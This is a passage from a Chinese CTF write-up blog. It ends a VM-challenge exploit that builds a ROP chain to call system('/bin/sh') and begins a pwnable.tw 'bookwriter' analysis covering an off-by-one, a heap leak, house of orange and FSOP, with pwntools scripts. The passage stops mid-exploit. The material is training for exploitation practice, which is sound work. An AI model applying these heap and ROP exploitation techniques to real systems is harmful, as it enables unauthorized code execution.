reg[1]=libc_start_main+128</span><br></code></pre></td></tr></table></figure><p>然后我们将各种 offset 写到栈上然后再来读取，读取后利用add ,sub可以计算中各种函数及gadgets的地址</p><p>各种偏移需要下断点来栈上查看</p><p>具体操作如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=p32(opcode(<span class="hljs-number">10</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0xdd8</span>,<span class="hljs-number">1</span>)) <span class="hljs-comment"># reg[1]=libc_start_main+128</span><br>payload+=p32(opcode(<span class="hljs-number">10</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x160</span>,<span class="hljs-number">30</span>)) <span class="hljs-comment"># reg[2]=offset</span><br>payload+=p32(opcode(<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)) <span class="hljs-comment"># reg[3]=reg[1]-reg[2]=libcbase</span><br>payload+=p32(opcode(<span class="hljs-number">10</span>,<span class="hljs-number">4</span>,<span class="hljs-number">0x168</span>,<span class="hljs-number">30</span>)) <span class="hljs-comment"># reg[4]=ret_offset</span><br>payload+=p32(opcode(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>)) <span class="hljs-comment"># reg[5]=reg[3]+reg[4]=ret_addr</span><br>payload+=p32(opcode(<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,<span class="hljs-number">0x170</span>,<span class="hljs-number">30</span>)) <span class="hljs-comment"># reg[6]=rdi_offset</span><br>payload+=p32(opcode(<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">6</span>,<span class="hljs-number">3</span>)) <span class="hljs-comment"># reg[7]=reg[6]+reg[3]=rdi_addr</span><br>payload+=p32(opcode(<span class="hljs-number">10</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0x178</span>,<span class="hljs-number">30</span>)) <span class="hljs-comment"># reg[8]=binsh_offset</span><br>payload+=p32(opcode(<span class="hljs-number">1</span>,<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">3</span>)) <span class="hljs-comment"># reg[9]=reg[8]+reg[3]=binsh_addr</span><br>payload+=p32(opcode(<span class="hljs-number">10</span>,<span class="hljs-number">10</span>,<span class="hljs-number">0x180</span>,<span class="hljs-number">30</span>)) <span class="hljs-comment"># reg[10]=system_offset</span><br>payload+=p32(opcode(<span class="hljs-number">1</span>,<span class="hljs-number">11</span>,<span class="hljs-number">10</span>,<span class="hljs-number">3</span>)) <span class="hljs-comment"># reg[11]=reg[10]+reg[3]=system_addr</span><br>payload+=p32(opcode(<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0xd38</span>,<span class="hljs-number">30</span>)) <span class="hljs-comment"># ret</span><br>payload+=p32(opcode(<span class="hljs-number">9</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0xd40</span>,<span class="hljs-number">30</span>)) <span class="hljs-comment"># rdi</span><br>payload+=p32(opcode(<span class="hljs-number">9</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0xd48</span>,<span class="hljs-number">30</span>)) <span class="hljs-comment"># binsh</span><br>payload+=p32(opcode(<span class="hljs-number">9</span>,<span class="hljs-number">11</span>,<span class="hljs-number">0xd50</span>,<span class="hljs-number">30</span>)) <span class="hljs-comment"># system</span><br>payload+=<span class="hljs-string">b&#x27;aaaa&#x27;</span><br><br>payload+=p64(offset)+p64(ret_offset)+p64(rdi_offset)+p64(binsh_offset)+p64(system_offset)<br></code></pre></td></tr></table></figure><p>后面就是将各种地址写到 main 的返回地址处即可</p><p>最后 main 函数返回地址处类似于</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">p64(ret)+p64(pop_rdi_ret_addr)+p64(binsh_addr)+p64(system_addr)<br></code></pre></td></tr></table></figure><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">opcode</span>(<span class="hljs-params">op, dst, src1, src2</span>):<br>    instr = ((op ) &lt;&lt; <span class="hljs-number">28</span>)+((src1) &lt;&lt; <span class="hljs-number">16</span>)+((src2 ) &lt;&lt; <span class="hljs-number">5</span>)+(dst )<br>    <span class="hljs-keyword">return</span> instr<br><br>r=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment"># r=remote(&quot;node1.anna.nssctf.cn&quot;,28517)</span><br>r.recvuntil(<span class="hljs-string">&quot;opcode: &quot;</span>)<br><br>offset=libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]+<span class="hljs-number">128</span><br>system_offset=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_offset=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>ret_offset=<span class="hljs-number">0x29139</span><br>rdi_offset=<span class="hljs-number">0x2a3e5</span>       <span class="hljs-comment"># main_ret=0xd38</span><br>one_gadget=<span class="hljs-number">0xebd43</span><br>payload=p32(opcode(<span class="hljs-number">10</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0xdd8</span>,<span class="hljs-number">1</span>)) <span class="hljs-comment"># reg[1]=libc_start_main+128</span><br>payload+=p32(opcode(<span class="hljs-number">10</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x160</span>,<span class="hljs-number">30</span>)) <span class="hljs-comment"># reg[2]=offset</span><br>payload+=p32(opcode(<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)) <span class="hljs-comment"># reg[3]=reg[1]-reg[2]=libcbase</span><br>payload+=p32(opcode(<span class="hljs-number">10</span>,<span class="hljs-number">4</span>,<span class="hljs-number">0x168</span>,<span class="hljs-number">30</span>)) <span class="hljs-comment"># reg[4]=ret_offset</span><br>payload+=p32(opcode(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>)) <span class="hljs-comment"># reg[5]=reg[3]+reg[4]=ret_addr</span><br>payload+=p32(opcode(<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,<span class="hljs-number">0x170</span>,<span class="hljs-number">30</span>)) <span class="hljs-comment"># reg[6]=rdi_offset</span><br>payload+=p32(opcode(<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">6</span>,<span class="hljs-number">3</span>)) <span class="hljs-comment"># reg[7]=reg[6]+reg[3]=rdi_addr</span><br>payload+=p32(opcode(<span class="hljs-number">10</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0x178</span>,<span class="hljs-number">30</span>)) <span class="hljs-comment"># reg[8]=binsh_offset</span><br>payload+=p32(opcode(<span class="hljs-number">1</span>,<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">3</span>)) <span class="hljs-comment"># reg[9]=reg[8]+reg[3]=binsh_addr</span><br>payload+=p32(opcode(<span class="hljs-number">10</span>,<span class="hljs-number">10</span>,<span class="hljs-number">0x180</span>,<span class="hljs-number">30</span>)) <span class="hljs-comment"># reg[10]=system_offset</span><br>payload+=p32(opcode(<span class="hljs-number">1</span>,<span class="hljs-number">11</span>,<span class="hljs-number">10</span>,<span class="hljs-number">3</span>)) <span class="hljs-comment"># reg[11]=reg[10]+reg[3]=system_addr</span><br>payload+=p32(opcode(<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0xd38</span>,<span class="hljs-number">30</span>)) <span class="hljs-comment"># ret</span><br>payload+=p32(opcode(<span class="hljs-number">9</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0xd40</span>,<span class="hljs-number">30</span>)) <span class="hljs-comment"># rdi</span><br>payload+=p32(opcode(<span class="hljs-number">9</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0xd48</span>,<span class="hljs-number">30</span>)) <span class="hljs-comment"># binsh</span><br>payload+=p32(opcode(<span class="hljs-number">9</span>,<span class="hljs-number">11</span>,<span class="hljs-number">0xd50</span>,<span class="hljs-number">30</span>)) <span class="hljs-comment"># system</span><br>payload+=<span class="hljs-string">b&#x27;aaaa&#x27;</span><br><br>payload+=p64(offset)+p64(ret_offset)+p64(rdi_offset)+p64(binsh_offset)+p64(system_offset)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">rsp=0x7ffc7aa35e40</span><br><span class="hljs-string">bss=0x64f8cc60c0c0</span><br><span class="hljs-string">main_ret=0x7ffffa2cd898</span><br><span class="hljs-string">pause()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>r.send(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>pwnable.tw-bookwriter</title>
    <link href="/2025/06/11/pwnable.tw-bookwriter/"/>
    <url>/2025/06/11/pwnable.tw-bookwriter/</url>
    
    <content type="html"><![CDATA[<h1 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">[*] &#x27;/home/yyyffff/桌面/bookwriter/bookwriter&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Full RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x3ff000)<br>    FORTIFY:    Enabled<br></code></pre></td></tr></table></figure><h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><p>（glibc-2.23）</p><h2 id="main"><a href="#main" class="headerlink" title="main"></a>main</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to the BookWriter !&quot;</span>);<br>  sub_400BDF();<span class="hljs-comment">//输入作者的函数</span><br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    sub_40093A(); <span class="hljs-comment">// 提供一个菜单</span><br>    <span class="hljs-keyword">switch</span> ( sub_4008CD() )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1LL</span>:<br>        sub_4009AA(); <span class="hljs-comment">//add</span><br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2LL</span>:<br>        sub_400A99(); <span class="hljs-comment">//view</span><br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3LL</span>:<br>        sub_400B27(); <span class="hljs-comment">//edit</span><br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4LL</span>:<br>        sub_400C04(); <span class="hljs-comment">//info</span><br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5LL</span>:<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid choice&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="author"><a href="#author" class="headerlink" title="author"></a>author</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">sub_400BDF</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Author :&quot;</span>);<br>  <span class="hljs-keyword">return</span> sub_400856((__int64)byte_602060, <span class="hljs-number">0x40u</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里<code>(__int64)byte_602060</code>和存储堆地址的数组连在了一起，</p><p><img src="/2025/06/11/pwnable.tw-bookwriter/1750828176519.png"></p><p>我们就可以输入0x40然后利用下面的<code>info</code>泄露出堆的地址</p><h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sub_4009AA</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  <span class="hljs-type">char</span> *v2; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  __int64 size; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( i &gt; <span class="hljs-number">8</span> )                                <span class="hljs-comment">// 多了一个，实际上可以分配9个堆，不过最后一个不能edit</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You can&#x27;t add new page anymore!&quot;</span>);<br>    <span class="hljs-keyword">if</span> ( !(&amp;qword_6020A0)[i] )                  <span class="hljs-comment">// 这个需要处理一下防止走到这个分支 edit中处理</span><br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Size of page :&quot;</span>);<br>  size = sub_4008CD();<br>  v2 = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size);<br>  <span class="hljs-keyword">if</span> ( !v2 )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Error !&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content :&quot;</span>);<br>  sub_400856(v2, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)size);<br>  (&amp;qword_6020A0)[i] = v2;<br>  qword_6020E0[i] = size;<br>  ++dword_602040;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done !&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>循环条件失误了，实际上可以分配9个堆</p><p>由于存储堆的地址<code>qword_6020A0</code>和存储堆大小的地址<code>qword_6020E0</code>连在了一起，当分配第九个堆的时候就可以将第一个堆的大小覆盖成第九个堆的地址<code>qword_6020A0[8]=qword_6020E0[0]</code>，一个堆的大小就会变成非常大，可以利用</p><h2 id="view"><a href="#view" class="headerlink" title="view"></a>view</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sub_400B27</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index of page :&quot;</span>);<br>  v1 = sub_4008CD();<br>  <span class="hljs-keyword">if</span> ( v1 &gt; <span class="hljs-number">7</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;out of page:&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( !(&amp;qword_6020A0)[v1] )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Not found !&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content:&quot;</span>);<br>  sub_400856((&amp;qword_6020A0)[v1], (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)qword_6020E0[v1]);<span class="hljs-comment">//read</span><br>  qword_6020E0[v1] = <span class="hljs-built_in">strlen</span>((&amp;qword_6020A0)[v1]);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done !&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>在17行重置大小的时候</p><ul><li>填充为当前堆块的大小，重置后就会使记录的大小变大（将下一个堆块的<code>size</code>域计算在内），这样在下一次修改的时候可以修改下一个堆块的<code>size</code>了</li><li>输入<code>\x00</code>就可以将当前的堆块记录的大小设置为0</li></ul><h2 id="info"><a href="#info" class="headerlink" title="info"></a>info</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_400C04</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  v1 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Author : %s\n&quot;</span>, byte_602060);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Page : %u\n&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)dword_602040);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Do you want to change the author ? (yes:1 / no:0) &quot;</span>);<br>  _isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 == <span class="hljs-number">1</span> )<br>    sub_400BDF();<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以与author结合起来，用来泄露堆的地址</p><h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><p>整体是用到FSOP伪造一个IO_list_all和vtable表，需要用到system函数，也就需要libc基址。还要知道堆上的地址</p><p>准备工作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;amd64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc_64.so.6&#x27;</span>)<br><span class="hljs-comment">#r=process(&#x27;./bookwriter&#x27;)</span><br>r=remote(<span class="hljs-string">&quot;chall.pwnable.tw&quot;</span>,<span class="hljs-number">10304</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;Size of page :&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(size))<br>    r.recvuntil(<span class="hljs-string">&quot;Content :&quot;</span>)<br>    r.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">view</span>(<span class="hljs-params">idx</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;Index of page :&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;Index of page :&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br>    r.recvuntil(<span class="hljs-string">&quot;Content:&quot;</span>)<br>    r.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">info</span>(<span class="hljs-params">cho,aut</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;Do you want to change the author ? (yes:1 / no:0) &quot;</span>)<br>    <span class="hljs-keyword">if</span> (cho):<br>        r.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>        r.recvuntil(<span class="hljs-string">&quot;Author :&quot;</span>)<br>        r.sendline(<span class="hljs-built_in">str</span>(aut))<br>    <span class="hljs-keyword">else</span>:<br>        r.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;5&quot;</span>)<br></code></pre></td></tr></table></figure><p>13行不能用sendline，因为这样会多发送一个，导致其他数据被覆盖</p><ul><li>因为没有free函数，这里用house of orange搞出一个在unsortedbin里的堆块。同时我们在第一步输入author填0x40大小的数据，再利用info就可以泄露出第一个堆块的地址，接着就是一系列地址的计算</li><li>house of orange就是当申请的块大小大于top chunk又小于mmap分配阈值，并且top chunk满足一些条件时，就会将当前的top chunk放入unsortedbin中并再扩展或映射一个新的top chunk出来。这里由于info里有scanf，而scanf又会申请0x1000的堆块，所以我们这里直接使用了info，没有自己申请</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">r.recvuntil(<span class="hljs-string">&quot;Author :&quot;</span>)<br>r.send(<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x39</span>+<span class="hljs-string">b&#x27;yyyffff&#x27;</span>) <span class="hljs-comment"># 填充0x40长度</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">b&#x27;aaa&#x27;</span>) <span class="hljs-comment"># 0</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x18</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">b&#x27;\xe1&#x27;</span>+<span class="hljs-string">b&#x27;\x0f&#x27;</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span>)<span class="hljs-comment"># 这里将top chunk大小修改为fe1，用于house of orange</span><br>r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>r.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>r.recvuntil(<span class="hljs-string">&quot;yyyffff&quot;</span>)<br>heap_addr=u64(r.recv(<span class="hljs-number">4</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x10</span> <span class="hljs-comment"># 泄露出堆地址</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;heap-&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(heap_addr))<br>r.recvuntil(<span class="hljs-string">&quot;Do you want to change the author ? (yes:1 / no:0) &quot;</span>)<br>r.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br>add(<span class="hljs-number">0x58</span>,<span class="hljs-string">b&#x27;aaaaaaaa&#x27;</span>) <span class="hljs-comment"># 1 这里分配的小块就是从unsortedbin中分配了。分配时不会清理堆块，里面fd bk都还在</span><br>view(<span class="hljs-number">1</span>)<br>r.recvuntil(<span class="hljs-string">&quot;Content :\naaaaaaaa&quot;</span>)<br>unsortedbin=u64(r.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x610</span> <span class="hljs-comment"># 